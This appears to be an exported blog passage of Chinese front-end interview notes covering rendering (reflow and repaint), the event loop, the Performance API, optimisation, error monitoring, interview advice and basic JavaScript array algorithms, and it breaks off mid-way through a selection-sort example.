定义重排（Reflow）是指元素的大小、位置发生了改变，而导致了布局的变化，从而导致了布局树的重新构建和渲染。 触发Reflow1.) 增加、删除、修改 DOM 节点时2.) 移动 DOM 位置的时候，比如某个动画3.) 元素尺寸改变（margin、padding、border、width、height）4.) 元素内容改变5.) 页面渲染器初始化6.) 浏览器窗口改变的时候 面试提示：如何避免？1.) 分离读写操作2.) 样式集中改变或切换class3.) 动画类使用absolute脱离文档流4.) 使用 visibility:hidden 代替 display:none，前者只会发生重绘，后者会发生回流5.）减少使用table布局，table布局中的的一个小改动都可能造成回流 重绘Repaint重排一定会触发重绘，而重绘不一定会重排 定义重绘是指css样式的改变，但元素的大小和尺寸不变，而导致节点的重新绘制。 触发Repaint任何的元素样式，如 background-color、border-color、visibility 等属性的改变。css 和 js 都可能引起重绘。 面试提示：如何最小程度的降低Repaint1.) DOM离线修改，先display:none，改完之后再显示2.) 样式集中改变或切换class 布局Layout js运行机制参考掘金 彻底弄懂 JavaScript 执行机制 12345678console.log(1);setTimeout(() =&gt; &#123; console.log(2);&#125;, 0);console.log(3);// 输出: 1 3 2// 因为setTimeout是一个异步任务 12345678console.log('A');while(true) &#123;&#125;console.log('B');// 输出: A// 且浏览器会不断的执行，导致崩溃。因为while是一个同步任务 12345678910console.log('A');setTimeout(() =&gt; &#123; console.log('B');&#125;, 0);while(true) &#123;&#125;// 输出: A// setTimeout内部永远不会被执行 123456789101112131415161718192021222324252627282930313233343536373839for (var i = 0; i &lt; 4; i++) &#123; setTimeout(() =&gt; &#123; console.log(i); &#125;, 0);&#125;// 输出: 4 4 4 4// 因为for循环是同步任务，每次循环产生的setTimeout都会放到异步对列中。执行完同步之后再执行异步，此时已经有四个待执行的异步任务了，而因为 i 是一个全局变量，所以会输出4个4// 即：同步for循环(i=0、i=1、i=2、i=3) -&gt; 异步// 改进（es6 let）for (let i = 0; i &lt; 4; i++) &#123; setTimeout(() =&gt; &#123; console.log(i); &#125;, 0);&#125;// 输出: 0 1 2 3，注意：内部setTimeout的时间如果设置为3000，则会在3s后输出0 1 2 3// 改进（内部使用自执行函数）：for (var i = 0; i &lt; 4; i++) &#123; (function(i) &#123; setTimeout(() =&gt; &#123; console.log(i); &#125;, 0); &#125;)(i);&#125;// 输出: 0 1 2 3，注意：内部setTimeout的时间如果设置为3000，则会在3s后输出0 1 2 3// 注意：某些情况下可以使用递归自执行函数解决(function log(i) &#123; if (i === 4) &#123; console.log('结束了') return; &#125; setTimeout(() =&gt; &#123; console.log(i); log(i + 1); &#125;, 0);&#125;)(0);// 输出: 0 1 2 3，注意：内部setTimeout的时间如果设置为3000，则会在每3s输出一个数，适用于有依赖关系的循环 异步任务： setTimeout、setInterval DOM事件 ES6 Promise 原理：js 是单线程的，任务队列分为同步任务和异步任务。 页面性能监控 performance Performance — 前端性能监控利器 参考：cnblogs Performance 前端性能监控利器 hash、chunkhash、contenthash hash: 跟整个项目的构建有关，构建生成的文件hash值都是一样的。同一次构建过程中生成的hash都是一样的，只要有文件修改，整个项目构建的hash都会发生变化。图片等资源例外，每个图片资源都拥有自己的hash，不同于全局hash。 chunkhash: 根据不同的入口文件（entry）进行依赖文件分析、构建对应的chunk，生成对应的hash值。生产环境中，将公共库和入口文件分开打包构建，再采用chunkhash的方式生成。这样在不改动公共文件的情况下，hash值不会受影响。chunkhash只能用在生产环境不能用在开发环境。 contenthash: 由文件内容产生的hash值，内容不同产生的contenthash就会不一致。通常把项目中的css都抽离出对应的css文件来加以引用。contenthash是extract-text-webpack-plugin插件引入的，解决修改样式文件导致js重新生成hash。 结论： 全局 Hash 和 js、css 的 hash一致 图片、字体等资源只有hash，但是该 hash 只是该图片自身的，不同于全局hash 如果对css使用chunkhash，它与依赖的chunk公用chunkhash，css和js的chunkhash是一致的。修改了js，css的hash也会变化。修改了css，js的hash值也会变化。 图片字体等使用hash，js使用chunkhash，css使用contenthash navigation属性 页面来源1window.performance.navigation type常数 枚举值 描述 TYPE_NAVIGATE 0 普通进入，包括：点击链接、在地址栏中输入 URL、表单提交、或者通过除下表中 TYPE_RELOAD 和 TYPE_BACK_FORWARD 的方式初始化脚本。 TYPE_RELOAD 1 通过刷新进入，包括：浏览器的刷新按钮、快捷键刷新、location.reload()等方法。 TYPE_BACK_FORWARD 2 通过操作历史记录进入，包括：浏览器的前进后退按钮、快捷键操作、history.forward()、history.back()、history.go(num)。 TYPE_UNDEFINED 255 其他非以上类型的方式进入。 memory属性 内存情况1window.performance.memory 属性 描述 jsHeapSizeLimit 内存大小限制 totalJSHeapSize 可使用的内存 usedJSHeapSize JS对象(包括V8引擎内部对象)占用的内存，不能大于totalJSHeapSize，如果大于，有可能出现了内存泄漏 timing属性 所有的时间1window.performance.timing 按触发顺序排列所有属性： 属性 描述 navigationStart 在同一个浏览器上下文中，前一个网页（与当前页面不一定同域）unload 的时间戳，如果无前一个网页 unload ，则与 fetchStart 值相等 unloadEventStart 前一个网页（与当前页面同域）unload 的时间戳，如果无前一个网页 unload 或者前一个网页与当前页面不同域，则值为 0 unloadEventEnd 和 unloadEventStart 相对应，返回前一个网页 unload 事件绑定的回调函数执行完毕的时间戳 redirectStart 第一个 HTTP 重定向发生时的时间。有跳转且是同域名内的重定向才算，否则值为 0 redirectEnd 最后一个 HTTP 重定向完成时的时间。有跳转且是同域名内的重定向才算，否则值为 0 fetchStart 浏览器准备好使用 HTTP 请求抓取文档的时间，这发生在检查本地缓存之前 domainLookupStart DNS 域名查询开始的时间，如果使用了本地缓存（即无 DNS 查询）或持久连接，则与 fetchStart 值相等 domainLookupEnd DNS 域名查询完成的时间，如果使用了本地缓存（即无 DNS 查询）或持久连接，则与 fetchStart 值相等 connectStart HTTP（TCP） 开始建立连接的时间，如果是持久连接，则与 fetchStart 值相等,如果在传输层发生了错误且重新建立连接，则这里显示的是新建立的连接开始的时间 connectEnd HTTP（TCP） 完成建立连接的时间（完成握手），如果是持久连接，则与 fetchStart 值相等,如果在传输层发生了错误且重新建立连接，则这里显示的是新建立的连接完成的时间注意：这里握手结束，包括安全连接建立完成、SOCKS 授权通过 secureConnectionStart HTTPS 连接开始的时间，如果不是安全连接，则值为 0 requestStart HTTP 请求读取真实文档开始的时间（完成建立连接），包括从本地读取缓存,连接错误重连时，这里显示的也是新建立连接的时间 responseStart HTTP 开始接收响应的时间（获取到第一个字节），包括从本地读取缓存 responseEnd HTTP 响应全部接收完成的时间（获取到最后一个字节），包括从本地读取缓存 domLoading 开始解析渲染 DOM 树的时间，此时 Document.readyState 变为 loading，并将抛出 readystatechange 相关事件 domInteractive 完成解析 DOM 树的时间，Document.readyState 变为 interactive，并将抛出 readystatechange 相关事件，注意：只是 DOM 树解析完成，这时候并没有开始加载网页内的资源 domContentLoadedEventStart DOM 解析完成后，网页内资源加载开始的时间,文档发生 DOMContentLoaded事件的时间 domContentLoadedEventEnd DOM 解析完成后，网页内资源加载完成的时间（如 JS 脚本加载执行完毕），文档的DOMContentLoaded 事件的结束时间 domComplete DOM 树解析完成，且资源也准备就绪的时间，Document.readyState 变为 complete，并将抛出 readystatechange 相关事件 loadEventStart load 事件发送给文档，也即 load 回调函数开始执行的时间,如果没有绑定 load 事件，值为 0 loadEventEnd load 事件的回调函数执行完毕的时间,如果没有绑定 load 事件，值为 0 常用计算：DNS查询耗时 ：domainLookupEnd - domainLookupStartTCP链接耗时 ：connectEnd - connectStartrequest请求耗时 ：responseEnd - responseStart解析dom树耗时 ： domComplete - domInteractive白屏时间 ：responseStart - navigationStartdomready时间(用户可操作时间节点) ：domContentLoadedEventEnd - navigationStartonload时间(总下载时间) ：loadEventEnd - navigationStart getEntries()方法 所有资源的信息1window.performance.getEntries().forEach(item =&gt; console.log(item)) 属性 描述 name 资源名称，是资源的绝对路径或调用mark方法自定义的名称 startTime 开始时间 duration 加载时间 entryType 资源类型 initiatorType 谁发起的请求 全局监控：如果我们想打印当前页面所有资源的信息，可导入下面的脚本。 1234567891011121314151617181920(function () &#123; // 浏览器不支持，就算了！ if (!window.performance &amp;&amp; !window.performance.getEntries) &#123; return false; &#125; var result = []; // 获取当前页面所有请求对应的PerformanceResourceTiming对象进行分析 window.performance.getEntries().forEach(function (perf) &#123; result.push(&#123; 'url': perf.name, 'entryType': perf.entryType, 'type': perf.initiatorType, 'duration(ms)': perf.duration &#125;); &#125;); // 控制台输出统计结果 console.table(result);&#125;)(); 页面性能优化 参考：segmentfault 浏览器渲染过程 网络请求的优化 静态资源1). 拼接、合并、压缩、制作雪碧图使用webpack或者gulp等打包工具对资源（js、css、图片等）进行打包、合并、去重、压缩。对于图片资源，我们可以制作雪碧图，优先使用webp格式，小图使用base64格式，根据不同的表现进行图片裁剪。 2). CDN资源分发将一些静态资源文件托管在第三方CDN服务中，一方面可以减少服务器的压力，另一方面，CDN的优势在于，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上，保证资源的加载速度和稳定性。 3). 缓存缓存的范围很广，比如协议层的DNS解析缓存、代理服务器缓存，到客户端的浏览器本地缓存，再到服务端的缓存。一个网络链路的每个环节都有被缓存的空间。缓存的目的是简化资源的请求路径，比如某些静态资源在客户端已经缓存了，再次请求这个资源，只需要使用本地的缓存，而无需走网络请求去服务端获取。 4). 分片分片指得是将资源分布到不同的主机，这是为了突破浏览器对同一台主机建立tcp连接的数量限制，一般为6~8个。现代网站的资源数量有50~100个很常见，所以将资源分布到不同的主机上，可以建立更多的tcp请求，降低请求耗时，从而提升网页速度。 5). DNS预解析（预先获得域名所对应的 IP） 1&lt;link rel="dns-prefetch" href="//yuchengkai.cn"&gt; 6). 资源预加载（有些资源不需要马上用到，但是希望尽早获取，这时候就可以使用预加载） 1&lt;link rel="preload" href="http://example.com"&gt; 7). 懒加载 业务数据1.）首屏直出为了提升用户体验，我们认为首屏的渲染速度是极为重要的，用户进来页面，首页可见区域的加载可以由服务端渲染，保证了首屏加载速度，而不可见的部分则可以异步加载，甚至做到子路由页面的预加载。 2.）接口合并前端经常有这样的场景，完成一个功能需要先请求第一个接口获得数据，然后再根据数据请求第二个接口获取第二个数据，然后第三、第四…前端通常需要通过promise或者回调，一层一层的then下去，这样显然是很消耗性能的。应该由服务端处理中间的流程，前端只发一次请求。 页面渲染性能的优化 防止阻塞渲染页面中的css 和 js 会阻塞html的解析，因为他们会影响dom树和render树。为了避免阻塞，我们可以做这些优化： 1.) css 放在首部，提前加载，这样做的原因是： 通常情况下 CSS 被认为是阻塞渲染的资源，在CSSOM 构建完成之前，页面不会被渲染，放在顶部让样式表能够尽早开始加载。但如果把引入样式表的 link 放在文档底部，页面虽然能立刻呈现出来，但是页面加载出来的时候会是没有样式的，是混乱的。当后来样式表加载进来后，页面会立即进行重绘，这也就是通常所说的闪烁了。 2.) js文件放在底部，防止阻塞解析 3.) 一些不改变dom和css的js 使用 defer 和 async 属性告诉浏览器可以异步加载，不阻塞解析 减少重排和重绘重绘和回流在实际开发中是很难避免的，我们能做的就是尽量减少这种行为的发生。 1.) js尽量少访问dom节点和css属性 2.) 尽可能的为产生动画的 HTML 元素使用 fixed 或 absolute 的 position ，那么修改他们的 CSS 是不会 Reflow 的。 3.) img标签要设置高宽，以减少重绘重排 4.) 把DOM离线后修改，如将一个dom脱离文档流，比如 display: none ，再修改属性，这里只发生一次回流。 5.) 尽量用 transform 来做形变和位移，不会造成回流 提高代码质量 html1.) dom层级不要太深，否则会增加dom树构建的时间，js访问深层的dom也会造成更大的负担。 2.) meta标签里需要定义文档的编码，便于浏览器解析 css1.) 减少 CSS 嵌套层级和选择适当的选择器 2.) 对于首屏的关键css 可以使用style标签内联 js1.) 减少通过 JavaScript 代码修改元素样式，尽量使用修改class名方式操作样式或动画。 2.) 访问dom节点时需要对dom节点缓存，防止循环中重复访问dom节点造成性能损耗。 3.) 慎用 定时器 和 计时器， 使用完后需要销毁。 4.) 用于复杂计算的js代码可以放在worker进程中运行 5.) 对于一些高频的回调需要对其节流和防抖，就是 throttle 和 debounce 这两个函数。比如 scroll 和 touch 事件。 面试回答 资源压缩、合并，减少HTTP请求 非核心代码异步加载1.) 动态脚本加载，使用js动态创建 script 然后插入到 head 中2.) defer，在 HTML 解析完之后才会执行，如果是多个，则按照顺序执行3.) async，加载完之后立即执行，如果是多个，执行顺序和加载顺序无关 结果： 12345678910// main// async1// async2// 也可能是（当实际文件内容差别大时）：// main// async2// async1// 先执行完后面的script标签，再不定顺序的执行async的script，async1 和 async2 的顺序不定 利用浏览器缓存(http协议头)1.) 强缓存(服务器同时下发这两个是，以Cache-Control为准)Expires &nbsp;&nbsp;&nbsp;&nbsp; Expires:Mon,18 Oct 2066 23:59:59 GMT Cache-Control &nbsp;&nbsp;&nbsp;&nbsp; Cache-Control:max-age=3600 2.) 协商缓存Last-Modify &nbsp;&nbsp;&nbsp;&nbsp; If-Modify-Since &nbsp;&nbsp;&nbsp;&nbsp; Last-Modify: Thu,31 Dec 2037 23:59:59 GMTETag &nbsp;&nbsp;&nbsp;&nbsp; If-None-Match &nbsp;&nbsp;&nbsp;&nbsp; 使用CDN（img、css、js） 预解析DNS 12&lt;meta http-equiv="x-dns-prefetch-control" content="on"&gt;&lt;link rel="dns-prefetch" href=""&gt; 代码优化 如何优化webpack优化打包速度 优化Loader，合理的使用loader的include和exclude（重点是对node_modules文件排查） HappyPack插件: 将loader的同步执行改成并行执行，加快打包效率 代码压缩：webpack-parallel-uglify-plugin 插件并行运行压缩 优化打包体积 按需加载 Scope Hoisting: 分析出模块之间的依赖关系，尽可能的把打包出来的模块合并到一个函数中去 Tree Shaking: 删除项目中未被引用的代码（webpack4自动开启） 错误监控 前端错误的分类1.) 即时运行错误（代码错误）2.) 资源加载错误（css、js加载错误） 错误捕获方式1.）即时运行错误 try...catch window.onerror / window.addEventListener(&#39;error&#39;, function () {})` 2.) 资源加载错误（冒泡无法获知，捕获可以获知） Obejct.onerror performance.getEntries() 123456performance.getEntries().forEach((item) =&gt; &#123; console.log(item);&#125;);// 会输入所有的资源信息// 判断总资源数是否相等（间接法） Error事件捕获 123456&lt;script&gt;window.addEventListener('error', function(e) &#123; console.log('捕获到异常', e);&#125;, true); // false表示冒泡，true表示捕获，资源加载异常只能通过捕获获知&lt;/script&gt;&lt;script src="//baidu.com/test.js"&gt;&lt;/script&gt; 3.) 提问：跨域的js可以捕获到错误码？错误提示是什么？应该怎么处理？ 错误提示从结果可以看出：无法获取具体的出错文件和代码行数 处理办法客户端：script 标签增加 crossorigin 属性服务端：设置js资源响应头 Access-Control-Allow-Origin:* 上报错误的基本原理1.) ajax 请求上报（可以做到，但是通常不会使用此方法）2.) image 对象上报，打点…123(new Image()).src = 'http://baidu.com/test?error=qwer'; // network中就可以看到这个请求了// 一些大公司的打点也是这个原理 面试技术面试 业务能力 做过什么业务校长教研员后台系统、教学助手、德育管理、小程序 负责的业务有什么业绩 使用了什么技术方案ECharts、Vue、html2canvas、小程序 突破了什么技术难点 遇到了什么问题合成pdf太大的问题（拆分多次上传）、ECharts数据太多（拆分成多个图表）、H5置顶问题/iOS输入框+列表滑动问题（修改布局） 最大的收获是什么对业务理解的更深入，对使用的技术更加熟练，更有把控 团队协作能力 事物推动能力（跨部门、跨组） 带人能力code reivew编写框架，通用方法的编写制定规范，eslint、变量、方法命名等对开发时间有整体把握，及时调整 其他能力 你还有什么要问的吗？对技术框架是否限制开发环境一共几种（本地、test、staging、线上）APP 页面开发时是否有一套成熟的客户端与js交互方法是否有公司自己的打点体系是否有deployer构建机制是否经常会有一些大牛技术分享会是否有相应的运维部门提供运维服务 HR面试 面试技巧 乐观积极 主动沟通 逻辑顺畅 上进有责任心 有主张、做事果断 内容分布（HR提问） 职业竞争力（为什么这个职位你会合适）1.) 业务能力（行业第一） 2.) 思考能力（对同一件事可以从不同的角度去思考问题，找到最优的解决方案） 遇到难题怎么办：先自身花时间上网查找解决方法，尽可能的自己去解决。实在无法解决的话，询问一下技术群大牛，寻求一些同行朋友的帮助。解决之后进行总结，为什么自己无法解决，而别人可以，别人解决问题的思路是什么，用了哪些技术方案等 3.) 学习能力（不断的学习新的业务和技术，沉淀、总结） 周末喜欢做什么：有空的时候会去参加一些分享会，多学习一些新的知识技能，了解一些行业的技术方案 4.) 无上限的付出（对于无法解决的问题可以熬夜、加班） 职业规划（对未来的规划）1.) 目标是什么 在业务上成为专家，帮助公司在行业上成为第一，在技术上成为行业大牛 2.) 近阶段的目标 不断的学习和积累各方面的经验，以学习为主 如果公司给我分配一个新岗位，我要先清楚岗位做什么，难点是什么，突破点在哪里，我要把它做到极值 3.) 长期目标 做几件很有价值的事，如开源作品、技术框架（这两点很重要） 4.) 方式方法 先完成业务上的主要问题，做到极致，然后逐步向目标靠拢 我希望公司技术部会定期有分享会，公司能给我一些工具、一些平台、一些权限让我能够最大高效的解决问题 沟通技巧多夸人，多赞美HR 面试技巧 JD描述（职位描述）校招一定要看 简历对照JD改出相吻合的简历，对于未掌握的技术栈快速复习、理解 自我介绍一定要打草稿，展示什么优势，描述什么项目，切忌临场发挥 面试流程 一面重基础懂原理要思考（不会的话不能直接回答不会，一定要深入思考）知进退（不懂的话，可以问面试官能不能给个指导方向、查询的资料等）势不可挡 二面横向扩展项目结合 三面有经验懂合作有担当懂规矩察言观色 终面会沟通要上进好性格有主见强逻辑无可挑剔 复盘胜不骄，败不馁总结经验步步为营多拿几个offer]]></content>
      <tags>
        <tag>Other</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端算法集合]]></title>
    <url>%2Fblog%2Fjavascript%2F%E5%89%8D%E7%AB%AF%E7%AE%97%E6%B3%95%E9%9B%86%E5%90%88.html</url>
    <content type="text"><![CDATA[使用前介绍123456// How to export and import module.exports = swap; --&gt; 对应 var s = require('../*.js');// 或：export default swap --&gt; 对应 import s from '../*.js'// 或:export &#123;swap&#125; --&gt; 对应 import &#123;swap&#125; from '../*.js' 不借助临时变量，交换整数加减乘除法注意：如果是浮点数，对于加减乘除法需要注意浮点数的精度丢失问题。12345678910111213141516171819202122232425262728293031// 思想：先求两个数的“和”，再用“和”去减function swap(a, b) &#123; // 如 [1, 3] a = a + b; // a = 1 + 3 = 4 b = a - b; // b = 4 - 3 = 1 a = a - b; // a = 4 - 1 = 3 return [a, b]; // [3, 1]&#125;// 思想：先求两个数的“差”，再用“差”去加function swap(a, b) &#123; // 如 [3, 1] a = a - b; // a = 3 - 1 = 2 b = a + b; // b = 2 + 1 = 3 a = b - a; // a = 3 - 2 = 1 return [a, b]; // [1, 3]&#125;// 思想：先求两个数的“乘积”，再用“乘积”去除function swap(a, b) &#123; // 如 [3, 8] a = a * b; // a = 3 * 8 = 24 b = a / b; // b = 24 / 8 = 3 a = a / b; // a = 24 / 3 = 8 return [a, b]; // [8, 3]&#125;// 思想：先求两个数的“商”，再用“商”去乘function swap(a, b) &#123; // 如 [8, 3] a = a / b; // a = 8 / 3 = 8 / 3 b = a * b; // b = (8 / 3) * 3 = 8 a = b / a; // a = 8 / (8 / 3) = 3 return [a, b]; // [3, 8]&#125; 对象法123456789function swap(a, b) &#123; // 如 [1, 3] a = &#123; a: b, b: a &#125; b = a.b; // 1 a = a.a; // 3 return [a, b]; // [3, 1]&#125; 数组法1234567891011function swap(a, b) &#123; // 如 [1, 3] a = [a, b]; b = a[0]; // 1 a = a[1]; // 3 return [a, b]; // [3, 1]&#125;function swap(a, b) &#123; // 如 [1, 3] a = [b, b = a][0]; // a = 3, b = 1; return [a, b]; // [3 ,1]&#125; ES6数组解构法，推荐1234function swap(a, b) &#123; // 如 [1, 3] [a, b] = [b, a]; return [a, b];&#125; 数组去重方法1（filter，推荐使用）1234567// filter函数会过滤出满足条件的元素function uniqueArr(arr)&#123; var newArr = arr.filter((item, index, self) =&gt; &#123; // 三个参数依次是：当前项、索引值、arr对象 return self.indexOf(item) === index; // 对于重复的元素，只有第一个元素符合条件，后面的都会被过滤掉 &#125;); return newArr;&#125; 方法2（新数组法）1234567891011function uniqueArr(arr)&#123; var newArr = []; // 一个新的临时数组 for(var i = 0; i &lt; arr.length; i++)&#123; // 遍历当前数组 // 如果当前数组的第i项已经保存进了临时数组，那么跳过， // 否则把当前项push到临时数组里面 if (newArr.indexOf(arr[i]) === -1)&#123; // 在新数组中查找原数组的每一项是否存在 newArr.push(arr[i]); // 如果不存在就加到新数组中 &#125; &#125; return newArr;&#125; 方法3（hash表法）12345678910function uniqueArr(arr) &#123; var obj = &#123;&#125;, newArr = []; // obj为hash表，newArr为临时数组 for(var i = 0; i &lt; arr.length; i++) &#123; // 遍历当前数组 , 可改成 for (var i in arr) &#123; if (!obj[arr[i]])&#123; // 如果hash表中没有当前项 obj[arr[i]] = true; // 存入hash表 newArr.push(arr[i]); // 把当前数组的当前项push到临时数组里面 &#125; &#125; return newArr;&#125; 方法41234567891011function uniqueArr(arr) &#123; var newArr = [arr[0]]; // 结果数组 for (var i = 1; i &lt; arr.length; i++) &#123; // 从第二项开始遍历 // 如果当前数组的第i项在当前数组中第一次出现的位置不是i， // 那么表示第i项是重复的，忽略掉。否则存入结果数组 if (arr.indexOf(arr[i]) === i) &#123; newArr.push(arr[i]); &#125; &#125; return newArr;&#125; 方法5（同时排序）12345678910function uniqueArr(arr)&#123; arr.sort(); // 数组排序 var newArr = [arr[0]]; // 先提取最小的 for (var i = 1; i &lt; arr.length; i++) &#123; if (arr[i] !== newArr[newArr.length-1]) &#123; // 将不等于的放在新数组的后面，等于的跳过 newArr.push(arr[i]); &#125; &#125; return newArr;&#125; 方法6（set + Array.from）1234function uniqueArr(arr) &#123; // new Set(arr); // input: [2, 3, 4, 5, 3, 5], output: &#123;2, 3, 4, 5&#125; return Array.from(new Set(arr));&#125; 方法7（set + …扩展运算符）1234function uniqueArr(arr) &#123; // new Set(arr); // input: [2, 3, 4, 5, 3, 5], output: &#123;2, 3, 4, 5&#125; return [...new Set(arr)];&#125; 实现数组的扁平化将多维数组变成一位数组：如[1, [2, 3, [4, 5]]] =&gt; [1, 2, 3, 4, 5] toString局限性：使用 toString() 方法后，所有的元素类型都变成了字符串，再使用Number还原，假设原数组中存在类型不一的元素，则不能还原类型123456function flatten(arr) &#123; return arr.toString().split(',').map(item =&gt; &#123; return Number(item) &#125;)&#125;flatten([1, [2, 3, [4, 5]]]) flat1[1, [2, 3]].flat() // 只适用于二维数组 reduce遍历每一项，如果值为数组，则递归遍历123456function flatten(arr) &#123; return arr.reduce((result, item, index, arr) =&gt; &#123; return result.concat(Array.isArray(item) ? flatten(item) : item) &#125;, [])&#125;flatten([1, [2, 3, [4, 5]]]) 递归123456789101112function flatten(arr) &#123; var result = [] arr.forEach(item =&gt; &#123; if (Array.isArray(item)) &#123; result = result.concat(flatten(item)) // 此处的递归很巧妙 &#125; else &#123; result.push(item) &#125; &#125;) return result&#125;flatten([1, [2, 3, [4, 5]]]) es6扩展运算符…1234567function flatten(arr) &#123; while (arr.some(item =&gt; Array.isArray(item))) &#123; arr = [].concat(...arr) &#125; return arr&#125;flatten([1, [2, 3, [4, 5]]]) 数组中含所有不定类型值的去重普通法12345678function uniqueArr(arr) &#123; for(let i = 0, len = arr.length; i &lt; len; i++)&#123; // 先处理特殊的类型：array、object、null if (typeof arr[i] === 'object' || Array.isArray(arr[i]) || ) &#123; &#125; &#125;&#125; map法123456789101112131415function uniqueArr(arr) &#123; var res = []; var o = Object.create(null); // 创建一个完全干净的空对象，内部没有__proto__属性 for(let v of arr) &#123; var type = typeof v; if(!o[v]) &#123; res.push(v); o[v] = [type]; &#125;else if(o[v].indexOf(type) == -1) &#123; o[v].push(type); res.push(v); &#125; &#125; return res;&#125; 取数组中的最大最小值排序法12345678var arr = [0, 2, 5, 1, 4, 3];arr.sort(function (a, b) &#123; return a - b;&#125;); // [0, 1, 2, 3, 4, 5]var min = arr[0]; // 0var max = arr[arr.length - 1]; // 5 apply方法1234567891011121314151617181920Math.max.apply(null, [1, 2, 3, 4]);Math.min.apply(null, [1, 2, 3, 4]);// apply()方法function.apply(thisObj[, argArray]); // 2个参数，参数2为数组// call()方法function.call(thisObj[, arg1[, arg2[, [, ...argN]]]]); // 多个参数，其他参数为非数组// 同理，利用apply方法还可以用于拼接数组：var arr1 = new Array("1", "2", "3");var arr2 = new Array("4", "5", "6");Array.prototype.push.apply(arr1, arr2); // 返回数组长度 6arr1.push.apply(arr1, arr2); // arr1:["1", "2", "3", "4", "5", "6"]// 上面的等同于arr1.push(...arr2); // ES6语法arr1.concat(arr2); // ES5语法// 更多apply和call用法见：https://www.cnblogs.com/lengyuehuahun/p/5643625.html 数组排序 参考：segmentfault【wscats】 十大经典排序算法 冒泡排序 比较相邻的元素，如果第一个比第二个大，就交换他们两个。 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 实际排序时，由后往前完成排序动作。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172function bubbleSort(arr) &#123; var len = arr.length; for (var i = 0; i &lt; len - 1; i++) &#123; for (var j = 0; j &lt; len - 1 - i; j++) &#123; if (arr[j] &gt; arr[j+1]) &#123; // 相邻元素两两对比 // 使用中间变量实现元素交互 // var temp = arr[j+1]; // arr[j+1] = arr[j]; // arr[j] = temp; // es6数组解构实现元素交互 [arr[j], arr[j+1]] = [arr[j+1], arr[j]]; &#125; &#125; &#125; return arr;&#125;// 假设arr是一个数组为5的数组// i j// ----// 0 0// 0 1// 0 2// 0 3// ----// 1 0// 1 1// 1 2// ----// 2 0// 2 1// ----// 3 0// 由上面可以看出，取arr[j]和arr[j+1]即是两个相邻元素的比较// 以数组[1, 8, 5, 4, 7, 3, 9, 2, 6]为例，实际冒泡排序如下：// ① ⑧ 5 4 7 3 9 2 6 // 1与8比较 =&gt; 1 8 5 4 7 3 9 2 6// 1 ⑧ ⑤ 4 7 3 9 2 6 // 8与5比较 =&gt; 1 5 8 4 7 3 9 2 6// 1 5 ⑧ ④ 7 3 9 2 6 // 8与4比较 =&gt; 1 5 4 8 7 3 9 2 6// 1 5 4 ⑧ ⑦ 3 9 2 6 // 8与7比较 =&gt; 1 5 4 7 8 3 9 2 6// 1 5 4 7 ⑧ ③ 9 2 6 // 8与3比较 =&gt; 1 5 4 7 3 8 9 2 6// 1 5 4 7 3 ⑧ ⑨ 2 6 // 8与9比较 =&gt; 1 5 4 7 3 8 9 2 6// 1 5 4 7 3 8 ⑨ ② 6 // 9与2比较 =&gt; 1 5 4 7 3 8 2 9 6// 1 5 4 7 3 8 2 ⑨ ⑥ // 9与6比较 =&gt; 1 5 4 7 3 8 2 6 9// // ① ⑤ 4 7 3 8 2 9 6 // 1与5比较 =&gt; 1 5 4 7 3 8 2 6 9// 1 ⑤ ④ 7 3 8 2 6 9 // 5与4比较 =&gt; 1 4 5 7 3 8 2 6 9// 1 4 ⑤ ⑦ 3 8 2 6 9 // 5与7比较 =&gt; 1 4 5 7 3 8 2 6 9// 1 4 5 ⑦ ③ 8 2 6 9 // 7与3比较 =&gt; 1 4 5 3 7 8 2 6 9// 1 4 5 3 ⑦ ⑧ 2 6 9 // 7与8比较 =&gt; 1 4 5 3 7 8 2 6 9// 1 4 5 3 7 ⑧ ② 6 9 // 8与2比较 =&gt; 1 4 5 3 7 2 8 6 9// 1 4 5 3 7 2 ⑧ ⑥ 9 // 8与6比较 =&gt; 1 4 5 3 7 2 6 8 9//// ① ④ 5 3 7 2 6 8 9 // 1与4比较 =&gt; 1 4 5 3 7 2 6 8 9// 1 ④ ⑤ 3 7 2 6 8 9 // 4与5比较 =&gt; 1 4 5 3 7 2 6 8 9// 1 4 ⑤ ③ 7 2 6 8 9 // 5与3比较 =&gt; 1 4 3 5 7 2 6 8 9// 1 4 3 ⑤ ⑦ 2 6 8 9 // 5与7比较 =&gt; 1 4 3 5 7 2 6 8 9// 1 4 3 5 ⑦ ② 6 8 9 // 7与2比较 =&gt; 1 4 3 5 2 7 6 8 9// 1 4 3 5 2 ⑦ ⑥ 8 9 // 7与6比较 =&gt; 1 4 3 5 2 6 7 8 9// // ① ④ 3 5 2 6 7 8 9 // 1与4比较 =&gt; 1 4 3 5 2 6 7 8 9// 1 ④ ③ 5 2 6 7 8 9 // 4与3比较 =&gt; 1 3 4 5 2 6 7 8 9// 1 3 ④ ⑤ 2 6 7 8 9 // 4与5比较 =&gt; 1 3 4 5 2 6 7 8 9// 1 3 4 ⑤ ② 6 7 8 9 // 5与2比较 =&gt; 1 3 4 2 5 6 7 8 9// 1 3 4 2 ⑤ ⑥ 7 8 9 // 5与6比较 =&gt; 1 3 4 2 5 6 7 8 9// // ... ...// // ① ② 3 4 5 6 7 8 9 // 1与2比较 =&gt; 1 2 3 4 5 6 7 8 9 选择排序 首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。 再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。 重复第二步，直到所有元素均排序完毕。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function selectionSort(arr) &#123; var len = arr.length; var minIndex, temp; for (var i = 0; i &lt; len - 1; i++) &#123; // 此处循环到倒数第二项即可，届时最后一项已经完成排序（最大或最小） minIndex = i; // 假设次数最小数的索引为当前i for (var j = i + 1; j &lt; len; j++) &#123; // 遍历i之后的数 if (arr[j] &lt; arr[minIndex]) &#123; // 存在比minIndex还小的数 minIndex = j; // 将最小数的索引赋给minIndex &#125; &#125; // 此时minIndex可能等于i（即上面遍历之后不存在更小的），也可能不等于i（存在更小的，即arr[minIndex] &lt; arr[i]）; // 但是此时minIndex &gt;= i，所以我们交换arr[i]和arr[minIndex]的位置即可 // 将 minIndex对应的数 